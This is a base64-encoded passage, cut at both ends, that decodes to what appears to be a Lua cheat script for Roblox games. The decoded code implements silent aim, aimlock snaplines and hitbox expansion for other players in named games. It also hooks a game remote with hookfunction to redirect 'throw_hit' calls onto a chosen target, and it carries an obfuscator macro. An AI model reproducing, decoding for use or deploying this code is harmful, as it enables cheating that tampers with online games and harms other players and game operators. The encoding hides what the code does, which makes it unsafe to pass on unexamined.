G9zaXRpb24gPSBTaWxlbnRGaWVsZE9mVmlldy5Qb3NpdGlvbgogICAgICAgICAgICBTaWxlbnRGaWVsZE9mVmlld0ZpbGwuVHJhbnNwYXJlbmN5ID0gQ29uZmlnLlNpbGVudC5GaWVsZE9mVmlld1RyYW5zcGFyZW5jeQoKICAgICAgICAgICAgU2lsZW50RmllbGRPZlZpZXdPdXRsaW5lLk51bVNpZGVzID0gQ29uZmlnLlNpbGVudC5TaWRlcwogICAgICAgICAgICBTaWxlbnRGaWVsZE9mVmlld091dGxpbmUuUG9zaXRpb24gPSBTaWxlbnRGaWVsZE9mVmlldy5Qb3NpdGlvbgogICAgICAgICAgICBTaWxlbnRGaWVsZE9mVmlld091dGxpbmUuVmlzaWJsZSA9IFNpbGVudEZpZWxkT2ZWaWV3LlZpc2libGUKICAgICAgICAgICAgU2lsZW50RmllbGRPZlZpZXdPdXRsaW5lLlJhZGl1cyA9IFNpbGVudEZpZWxkT2ZWaWV3LlJhZGl1cwoKICAgICAgICAgICAgU2lsZW50U25hcGxpbmUuVmlzaWJsZSA9IChDb25maWcuU2lsZW50LkVuYWJsZWQgPT0gdHJ1ZSkgYW5kIChDb25maWcuU2lsZW50LlRhcmdldHRpbmcgPT0gdHJ1ZSkgYW5kIENvbmZpZy5TaWxlbnQuU25hcGxpbmUgYW5kIChTaWxlbnRUYXJnZXQgfj0gbmlsKQogICAgICAgICAgICBTaWxlbnRTbmFwbGluZS5Db2xvciA9IENvbmZpZy5TaWxlbnQuU25hcGxpbmVDb2xvcgogICAgICAgICAgICBTaWxlbnRTbmFwbGluZS5UaGlja25lc3MgPSBDb25maWcuU2lsZW50LlNuYXBsaW5lVGhpY2tuZXNzOwogICAgICAgICAgICBTaWxlbnRTbmFwbGluZU91dGxpbmUuVGhpY2tuZXNzID0gQ29uZmlnLlNpbGVudC5TbmFwbGluZVRoaWNrbmVzcyArIDIKICAgICAgICAgICAgU2lsZW50U25hcGxpbmVPdXRsaW5lLlZpc2libGUgPSBTaWxlbnRTbmFwbGluZS5WaXNpYmxlCgogICAgICAgICAgICBBaW1ib3RTbmFwbGluZS5Db2xvciA9IENvbmZpZy5BaW1sb2NrLlNuYXBsaW5lQ29sb3IKICAgICAgICAgICAgQWltYm90U25hcGxpbmUuVmlzaWJsZSA9IChDb25maWcuQWltbG9jay5FbmFibGVkID09IHRydWUpIGFuZCAoQ29uZmlnLkFpbWxvY2suQWltaW5nID09IHRydWUpIGFuZCBDb25maWcuQWltbG9jay5TbmFwbGluZSBhbmQgKEFpbWxvY2tUYXJnZXQgfj0gbmlsKQogICAgICAgICAgICBBaW1ib3RTbmFwbGluZS5UaGlja25lc3MgPSBDb25maWcuQWltbG9jay5TbmFwbGluZVRoaWNrbmVzczsKICAgICAgICAgICAgQWltYm90U25hcGxpbmVPdXRsaW5lLlRoaWNrbmVzcyA9IENvbmZpZy5BaW1sb2NrLlNuYXBsaW5lVGhpY2tuZXNzICsgMgogICAgICAgICAgICBBaW1ib3RTbmFwbGluZU91dGxpbmUuVmlzaWJsZSA9IEFpbWJvdFNuYXBsaW5lLlZpc2libGUKCiAgICAgICAgICAgIGlmIChub3QgU2lsZW50VGFyZ2V0IG9yIG5vdCBTaWxlbnRUYXJnZXQuQ2hhcmFjdGVyIG9yIG5vdCBTaWxlbnRUYXJnZXQuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIZWFkIikpIHRoZW4KICAgICAgICAgICAgICAgIFNpbGVudFNuYXBsaW5lLlZpc2libGUgPSBmYWxzZQogICAgICAgICAgICBlbmQ7CgogICAgICAgICAgICBpZiAobm90IEFpbWxvY2tUYXJnZXQgb3Igbm90IEFpbWxvY2tUYXJnZXQuQ2hhcmFjdGVyIG9yIG5vdCBBaW1sb2NrVGFyZ2V0LkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZChDb25maWcuQWltbG9jay5UYXJnZXRQYXJ0KSkgdGhlbgogICAgICAgICAgICAgICAgQWltYm90U25hcGxpbmUuVmlzaWJsZSA9IGZhbHNlCiAgICAgICAgICAgIGVuZDsKCiAgICAgICAgICAgIGxvY2FsIF9QYXJ0ID0gIkhlYWQiCgogICAgICAgICAgICBpZiBTaWxlbnRUYXJnZXQgYW5kIFNpbGVudFRhcmdldC5DaGFyYWN0ZXIgYW5kIFNpbGVudFRhcmdldC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoX1BhcnQpIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIFNpbGVudFBvc2l0aW9uLCBPblNjcmVlbiA9IENhbWVyYTpXb3JsZFRvVmlld3BvcnRQb2ludChTaWxlbnRUYXJnZXQuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKF9QYXJ0KS5Qb3NpdGlvbikKCiAgICAgICAgICAgICAgICBTaWxlbnRTbmFwbGluZS5WaXNpYmxlID0gKENvbmZpZy5TaWxlbnQuU25hcGxpbmUgYW5kIFNpbGVudFRhcmdldCBhbmQgT25TY3JlZW4pCiAgICAgICAgICAgICAgICBTaWxlbnRTbmFwbGluZS5WaXNpYmxlID0gU2lsZW50U25hcGxpbmUuVmlzaWJsZQoKICAgICAgICAgICAgICAgIGlmIChTaWxlbnRTbmFwbGluZS5WaXNpYmxlIGFuZCBPblNjcmVlbikgdGhlbgogICAgICAgICAgICAgICAgICAgIFNpbGVudFNuYXBsaW5lLkZyb20gPSBNb3VzZUxvY2F0aW9uCiAgICAgICAgICAgICAgICAgICAgU2lsZW50U25hcGxpbmVPdXRsaW5lLkZyb20gPSBTaWxlbnRTbmFwbGluZS5Gcm9tCgogICAgICAgICAgICAgICAgICAgIFNpbGVudFNuYXBsaW5lLlRvID0gVmVjdG9yMi5uZXcoU2lsZW50UG9zaXRpb24uWCwgU2lsZW50UG9zaXRpb24uWSkKICAgICAgICAgICAgICAgICAgICBTaWxlbnRTbmFwbGluZU91dGxpbmUuVG8gPSBTaWxlbnRTbmFwbGluZS5UbwogICAgICAgICAgICAgICAgZW5kOwogICAgICAgICAgICBlbmQ7CgogICAgICAgICAgICBpZiBBaW1sb2NrVGFyZ2V0IGFuZCBBaW1sb2NrVGFyZ2V0LkNoYXJhY3RlciBhbmQgQWltbG9ja1RhcmdldC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoQ29uZmlnLkFpbWxvY2suVGFyZ2V0UGFydCkgdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgQWltbG9ja1Bvc2l0aW9uLCBPblNjcmVlbiA9IENhbWVyYTpXb3JsZFRvVmlld3BvcnRQb2ludChBaW1sb2NrVGFyZ2V0LkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZChDb25maWcuQWltbG9jay5UYXJnZXRQYXJ0KS5Qb3NpdGlvbikKCiAgICAgICAgICAgICAgICBBaW1ib3RTbmFwbGluZS5WaXNpYmxlID0gKENvbmZpZy5BaW1sb2NrLlNuYXBsaW5lIGFuZCBBaW1sb2NrVGFyZ2V0IGFuZCBPblNjcmVlbikKICAgICAgICAgICAgICAgIEFpbWJvdFNuYXBsaW5lT3V0bGluZS5WaXNpYmxlID0gQWltYm90U25hcGxpbmUuVmlzaWJsZQoKICAgICAgICAgICAgICAgIGlmIChBaW1ib3RTbmFwbGluZS5WaXNpYmxlIGFuZCBPblNjcmVlbikgdGhlbgogICAgICAgICAgICAgICAgICAgIEFpbWJvdFNuYXBsaW5lLkZyb20gPSBNb3VzZUxvY2F0aW9uCiAgICAgICAgICAgICAgICAgICAgQWltYm90U25hcGxpbmVPdXRsaW5lLkZyb20gPSBBaW1ib3RTbmFwbGluZS5Gcm9tCgogICAgICAgICAgICAgICAgICAgIEFpbWJvdFNuYXBsaW5lLlRvID0gVmVjdG9yMi5uZXcoQWltbG9ja1Bvc2l0aW9uLlgsIEFpbWxvY2tQb3NpdGlvbi5ZKQogICAgICAgICAgICAgICAgICAgIEFpbWJvdFNuYXBsaW5lT3V0bGluZS5UbyA9IEFpbWJvdFNuYXBsaW5lLlRvCiAgICAgICAgICAgICAgICBlbmQ7CiAgICAgICAgICAgIGVuZDsKICAgICAgICBlbmQpKTsKCiAgICAgICAgaWYgbm90IExvY2FsUGxheWVyLkNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgIExvY2FsUGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCBDb25uZWN0SGl0Ym94VG9QbGF5ZXIgPSBmdW5jdGlvbihQbGF5ZXIpCiAgICAgICAgICAgIHRhc2suc3Bhd24oTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgd2hpbGUgKFBsYXllciB+PSBuaWwpIGFuZCB0YXNrLndhaXQoMC4yNSkgZG8KICAgICAgICAgICAgICAgICAgICBpZiBub3QgUGxheWVyLkNoYXJhY3RlciB0aGVuIGNvbnRpbnVlIGVuZAogICAgICAgICAgICAgICAgICAgIGlmIFBsYXllci5DaGFyYWN0ZXIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIG9yIG5vdCBQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkhlYWQiKSBvciBub3QgUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIEh1bWFub2lkUm9vdFBhcnQsIEhlYWQsIEh1bWFub2lkID0gUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpLCBQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIZWFkIiksIFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIEh1bWFub2lkLlNpdCBhbmQgbm90IERlZmF1bHRQbGF5ZXJTZXR0aW5nc1tQbGF5ZXIuTmFtZV0gdGhlbiBjb250aW51ZSBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBEZWZhdWx0UGxheWVyU2V0dGluZ3NbUGxheWVyLk5hbWVdIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIERlZmF1bHRQbGF5ZXJTZXR0aW5nc1tQbGF5ZXIuTmFtZV0gPSB7fQogICAgICAgICAgICAgICAgICAgICAgICAgICAgRGVmYXVsdFBsYXllclNldHRpbmdzW1BsYXllci5OYW1lXS5IZWFkU2V0dGluZ3MgPSB7fQogICAgICAgICAgICAgICAgICAgICAgICAgICAgRGVmYXVsdFBsYXllclNldHRpbmdzW1BsYXllci5OYW1lXS5Sb290U2V0dGluZ3MgPSB7fQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIERlZmF1bHRQbGF5ZXJTZXR0aW5nc1tQbGF5ZXIuTmFtZV0uSGVhZFNldHRpbmdzLlNpemUgPSBIZWFkLlNpemUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIERlZmF1bHRQbGF5ZXJTZXR0aW5nc1tQbGF5ZXIuTmFtZV0uSGVhZFNldHRpbmdzLkNvbG9yID0gSGVhZC5Db2xvcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgRGVmYXVsdFBsYXllclNldHRpbmdzW1BsYXllci5OYW1lXS5IZWFkU2V0dGluZ3MuTWFzc2xlc3MgPSBIZWFkLk1hc3NsZXNzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBEZWZhdWx0UGxheWVyU2V0dGluZ3NbUGxheWVyLk5hbWVdLkhlYWRTZXR0aW5ncy5DYW5Db2xsaWRlID0gSGVhZC5DYW5Db2xsaWRlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBEZWZhdWx0UGxheWVyU2V0dGluZ3NbUGxheWVyLk5hbWVdLkhlYWRTZXR0aW5ncy5NYXRlcmlhbCA9IEhlYWQuTWF0ZXJpYWwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIERlZmF1bHRQbGF5ZXJTZXR0aW5nc1tQbGF5ZXIuTmFtZV0uSGVhZFNldHRpbmdzLlRyYW5zcGFyZW5jeSA9IEhlYWQuVHJhbnNwYXJlbmN5CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgRGVmYXVsdFBsYXllclNldHRpbmdzW1BsYXllci5OYW1lXS5Sb290U2V0dGluZ3MuU2l6ZSA9IEh1bWFub2lkUm9vdFBhcnQuU2l6ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgRGVmYXVsdFBsYXllclNldHRpbmdzW1BsYXllci5OYW1lXS5Sb290U2V0dGluZ3MuQ29sb3IgPSBIdW1hbm9pZFJvb3RQYXJ0LkNvbG9yCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBEZWZhdWx0UGxheWVyU2V0dGluZ3NbUGxheWVyLk5hbWVdLlJvb3RTZXR0aW5ncy5NYXNzbGVzcyA9IEh1bWFub2lkUm9vdFBhcnQuTWFzc2xlc3MKICAgICAgICAgICAgICAgICAgICAgICAgICAgIERlZmF1bHRQbGF5ZXJTZXR0aW5nc1tQbGF5ZXIuTmFtZV0uUm9vdFNldHRpbmdzLkNhbkNvbGxpZGUgPSBIdW1hbm9pZFJvb3RQYXJ0LkNhbkNvbGxpZGUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIERlZmF1bHRQbGF5ZXJTZXR0aW5nc1tQbGF5ZXIuTmFtZV0uUm9vdFNldHRpbmdzLk1hdGVyaWFsID0gSHVtYW5vaWRSb290UGFydC5NYXRlcmlhbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgRGVmYXVsdFBsYXllclNldHRpbmdzW1BsYXllci5OYW1lXS5Sb290U2V0dGluZ3MuVHJhbnNwYXJlbmN5ID0gSHVtYW5vaWRSb290UGFydC5UcmFuc3BhcmVuY3kKICAgICAgICAgICAgICAgICAgICAgICAgICAgIERlZmF1bHRQbGF5ZXJTZXR0aW5nc1tQbGF5ZXIuTmFtZV0uUm9vdFNldHRpbmdzLlNoYXBlID0gSHVtYW5vaWRSb290UGFydC5TaGFwZQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBDb25maWcuTWlzY1NldHRpbmdzLkhpdGJveF9FeHBhbmRlci5FbmFibGVkIG9yIEh1bWFub2lkLlNpdCBvciBIdW1hbm9pZC5IZWFsdGggPT0gMCBvciB0YWJsZS5maW5kKGxpYnJhcnkud2hpdGVsaXN0LCBQbGF5ZXIuTmFtZSkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIEluZGV4LCBWYWx1ZSBpbiBEZWZhdWx0UGxheWVyU2V0dGluZ3NbUGxheWVyLk5hbWVdLlJvb3RTZXR0aW5ncyBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEh1bWFub2lkUm9vdFBhcnRbSW5kZXhdID0gVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBJbmRleCwgVmFsdWUgaW4gRGVmYXVsdFBsYXllclNldHRpbmdzW1BsYXllci5OYW1lXS5IZWFkU2V0dGluZ3MgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBIZWFkW0luZGV4XSA9IFZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBIZWFkOkZpbmRGaXJzdENoaWxkKCJNZXNoUGFydCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBIZWFkLk1lc2guTWVzaElkID0gInJieGFzc2V0aWQ6Ly8xMjIzMjQyODY1NzMzNzQiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIENvbmZpZy5NaXNjU2V0dGluZ3MuSGl0Ym94X0V4cGFuZGVyLlBhcnQgPT0gIkhlYWQiIGFuZCBDb25maWcuTWlzY1NldHRpbmdzLkhpdGJveF9FeHBhbmRlci5FbmFibGVkIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBJbmRleCwgVmFsdWUgaW4gRGVmYXVsdFBsYXllclNldHRpbmdzW1BsYXllci5OYW1lXS5Sb290U2V0dGluZ3MgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBIdW1hbm9pZFJvb3RQYXJ0W0luZGV4XSA9IFZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgICAgICBpZiBDb25maWcuTWlzY1NldHRpbmdzLkhpdGJveF9FeHBhbmRlci5QYXJ0ID09ICJIdW1hbm9pZFJvb3RQYXJ0IiBhbmQgQ29uZmlnLk1pc2NTZXR0aW5ncy5IaXRib3hfRXhwYW5kZXIuRW5hYmxlZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgSW5kZXgsIFZhbHVlIGluIERlZmF1bHRQbGF5ZXJTZXR0aW5nc1tQbGF5ZXIuTmFtZV0uSGVhZFNldHRpbmdzIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSGVhZFtJbmRleF0gPSBWYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgSGVhZDpGaW5kRmlyc3RDaGlsZCgiTWVzaFBhcnQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSGVhZC5NZXNoLk1lc2hJZCA9ICJyYnhhc3NldGlkOi8vODYzNTM2ODQyMSIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIENvbmZpZy5NaXNjU2V0dGluZ3MuSGl0Ym94X0V4cGFuZGVyLlBhcnQgPT0gIkhlYWQiIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIENvbmZpZy5NaXNjU2V0dGluZ3MuSGl0Ym94X0V4cGFuZGVyLkVuYWJsZWQgYW5kIEh1bWFub2lkLkhlYWx0aCB+PSAwIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBIZWFkLlNpemUgPSBWZWN0b3IzLm5ldyhDb25maWcuTWlzY1NldHRpbmdzLkhpdGJveF9FeHBhbmRlci5NdWx0aXBsaWVyLCBDb25maWcuTWlzY1NldHRpbmdzLkhpdGJveF9FeHBhbmRlci5NdWx0aXBsaWVyLCBDb25maWcuTWlzY1NldHRpbmdzLkhpdGJveF9FeHBhbmRlci5NdWx0aXBsaWVyKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEhlYWQuVHJhbnNwYXJlbmN5ID0gQ29uZmlnLk1pc2NTZXR0aW5ncy5IaXRib3hfRXhwYW5kZXIuVHJhbnNwYXJlbmN5CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSGVhZC5NYXRlcmlhbCA9IEVudW0uTWF0ZXJpYWxbQ29uZmlnLk1pc2NTZXR0aW5ncy5IaXRib3hfRXhwYW5kZXIuTWF0ZXJpYWxdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSGVhZC5Db2xvciA9IENvbmZpZy5NaXNjU2V0dGluZ3MuSGl0Ym94X0V4cGFuZGVyLkNvbG9yCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSGVhZC5DYW5Db2xsaWRlID0gbm90IERlZmF1bHRQbGF5ZXJTZXR0aW5nc1tQbGF5ZXIuTmFtZV0uSGVhZFNldHRpbmdzLkNhbkNvbGxpZGUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBIZWFkLk1hc3NsZXNzID0gbm90IERlZmF1bHRQbGF5ZXJTZXR0aW5nc1tQbGF5ZXIuTmFtZV0uSGVhZFNldHRpbmdzLk1hc3NsZXNzCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIEhlYWQ6RmluZEZpcnN0Q2hpbGQoIk1lc2hQYXJ0IikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBIZWFkLk1lc2guTWVzaElkID0gIiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBDb25maWcuTWlzY1NldHRpbmdzLkhpdGJveF9FeHBhbmRlci5FbmFibGVkIGFuZCBIdW1hbm9pZC5IZWFsdGggfj0gMCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSHVtYW5vaWRSb290UGFydC5TaXplID0gVmVjdG9yMy5uZXcoQ29uZmlnLk1pc2NTZXR0aW5ncy5IaXRib3hfRXhwYW5kZXIuTXVsdGlwbGllciwgQ29uZmlnLk1pc2NTZXR0aW5ncy5IaXRib3hfRXhwYW5kZXIuTXVsdGlwbGllciwgQ29uZmlnLk1pc2NTZXR0aW5ncy5IaXRib3hfRXhwYW5kZXIuTXVsdGlwbGllcikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBIdW1hbm9pZFJvb3RQYXJ0LlRyYW5zcGFyZW5jeSA9IENvbmZpZy5NaXNjU2V0dGluZ3MuSGl0Ym94X0V4cGFuZGVyLlRyYW5zcGFyZW5jeQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEh1bWFub2lkUm9vdFBhcnQuTWF0ZXJpYWwgPSBFbnVtLk1hdGVyaWFsW0NvbmZpZy5NaXNjU2V0dGluZ3MuSGl0Ym94X0V4cGFuZGVyLk1hdGVyaWFsXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEh1bWFub2lkUm9vdFBhcnQuU2hhcGUgPSBFbnVtLlBhcnRUeXBlW0NvbmZpZy5NaXNjU2V0dGluZ3MuSGl0Ym94X0V4cGFuZGVyLlR5cGVdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSHVtYW5vaWRSb290UGFydC5Db2xvciA9IENvbmZpZy5NaXNjU2V0dGluZ3MuSGl0Ym94X0V4cGFuZGVyLkNvbG9yCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSHVtYW5vaWRSb290UGFydC5DYW5Db2xsaWRlID0gbm90IERlZmF1bHRQbGF5ZXJTZXR0aW5nc1tQbGF5ZXIuTmFtZV0uUm9vdFNldHRpbmdzLkNhbkNvbGxpZGUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpKQogICAgICAgIGVuZAoKICAgICAgICBmb3IgSW5kZXgsIFZhbHVlIGluIFBsYXllcnM6R2V0UGxheWVycygpIGRvCiAgICAgICAgICAgIGlmIFZhbHVlID09IExvY2FsUGxheWVyIHRoZW4gY29udGludWUgZW5kOwogICAgICAgICAgICBpZiBHYW1lX05hbWUgPT0gIlNvdXRoIEJyb254IiB0aGVuIGNvbnRpbnVlIGVuZAogICAgICAgICAgICBpZiBHYW1lX05hbWUgPT0gIkNyaW1pbmFsaXR5IiB0aGVuIGNvbnRpbnVlIGVuZAogICAgICAgICAgICBpZiBHYW1lX05hbWUgPT0gIlVuaXZlcnNhbCIgdGhlbiBjb250aW51ZSBlbmQKICAgICAgICAgICAgaWYgR2FtZV9OYW1lID09ICJCbG9ja1NwaW4iIHRoZW4gY29udGludWUgZW5kCgogICAgICAgICAgICBDb25uZWN0SGl0Ym94VG9QbGF5ZXIoVmFsdWUpCiAgICAgICAgZW5kCgogICAgICAgIFBsYXllcnMuUGxheWVyQWRkZWQ6Q29ubmVjdChmdW5jdGlvbihWYWx1ZSkKICAgICAgICAgICAgaWYgR2FtZV9OYW1lID09ICJTb3V0aCBCcm9ueCIgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgICAgIGlmIEdhbWVfTmFtZSA9PSAiQ3JpbWluYWxpdHkiIHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICBpZiBHYW1lX05hbWUgPT0gIlVuaXZlcnNhbCIgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgICAgIGlmIEdhbWVfTmFtZSA9PSAiQmxvY2tTcGluIiB0aGVuIHJldHVybiBlbmQKCiAgICAgICAgICAgIENvbm5lY3RIaXRib3hUb1BsYXllcihWYWx1ZSkKICAgICAgICBlbmQpCgogICAgICAgIC0tbG9jYWwgU3RhbWluYVJlZ2VuLCBNYXhTdGFtaW5hID0gTG9jYWxQbGF5ZXI6R2V0QXR0cmlidXRlKCJTdGFtaW5hUmVnZW4iKSwgTG9jYWxQbGF5ZXI6R2V0QXR0cmlidXRlKCJNYXhTdGFtaW5hIikKCiAgICAgICAgaWYgR2FtZV9OYW1lID09ICJCbG9ja1NwaW4iIHRoZW4KICAgICAgICAgICAgLS1bW2xvY2FsIFNldF9TdGFtaW5hID0gZmFsc2U7CgogICAgICAgICAgICBSdW5TZXJ2aWNlLlByZVJlbmRlcjpDb25uZWN0KExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIGlmIENvbmZpZy5CbG9ja1NwaW4uTG9jYWxQbGF5ZXIuSW5maW5pdGVTdGFtaW5hIHRoZW4KICAgICAgICAgICAgICAgICAgICBTZXRfU3RhbWluYSA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgTG9jYWxQbGF5ZXI6U2V0QXR0cmlidXRlKCJTdGFtaW5hUmVnZW4iLCBtYXRoLmh1Z2UpCiAgICAgICAgICAgICAgICAgICAgTG9jYWxQbGF5ZXI6U2V0QXR0cmlidXRlKCJNYXhTdGFtaW5hIiwgbWF0aC5odWdlKQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBTZXRfU3RhbWluYSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIFNldF9TdGFtaW5hID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllcjpTZXRBdHRyaWJ1dGUoIlN0YW1pbmFSZWdlbiIsIFN0YW1pbmFSZWdlbikKICAgICAgICAgICAgICAgICAgICAgICAgTG9jYWxQbGF5ZXI6U2V0QXR0cmlidXRlKCJNYXhTdGFtaW5hIiwgTWF4U3RhbWluYSkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpKV1dCgogICAgICAgICAgICBsb2NhbCBfU2VuZDsgX1NlbmQgPSBob29rZnVuY3Rpb24oU2VuZF9SZW1vdGUsIExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKC4uLikKICAgICAgICAgICAgICAgIGxvY2FsIEFyZ3VtZW50cyA9IHsuLi59CgogICAgICAgICAgICAgICAgaWYgQXJndW1lbnRzWzFdID09ICJ0aHJvd19oaXQiIHRoZW4KICAgICAgICAgICAgICAgICAgICBpZiBub3QgQ29uZmlnLlNpbGVudC5FbmFibGVkIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIF9TZW5kKC4uLikKICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgaWYgY2hlY2tjYWxsZXIoKSBvciBub3QgU2lsZW50VGFyZ2V0IG9yIG5vdCAobWF0aHJhbmRvbSgwLCAxMDApIDw9IENvbmZpZy5TaWxlbnQuSGl0Q2hhbmNlKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBfU2VuZCguLi4pCiAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgIGxvY2FsIFJhbmRvbVBhcnQgPSBDb25maWcuU2lsZW50LlRhcmdldFBhcnRbMV0gYW5kIENvbmZpZy5TaWxlbnQuVGFyZ2V0UGFydFttYXRoLnJhbmRvbSgxLCAjQ29uZmlnLlNpbGVudC5UYXJnZXRQYXJ0KV0gb3IgIkhlYWQiCgogICAgICAgICAgICAgICAgICAgIGxvY2FsIFRhcmdldFBhcnQgPSBTaWxlbnRUYXJnZXQuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKFJhbmRvbVBhcnQpCgogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBTaWxlbnRUYXJnZXQuQ2hhcmFjdGVyIG9yIG5vdCBUYXJnZXRQYXJ0IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIF9TZW5kKC4uLikKICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgQXJn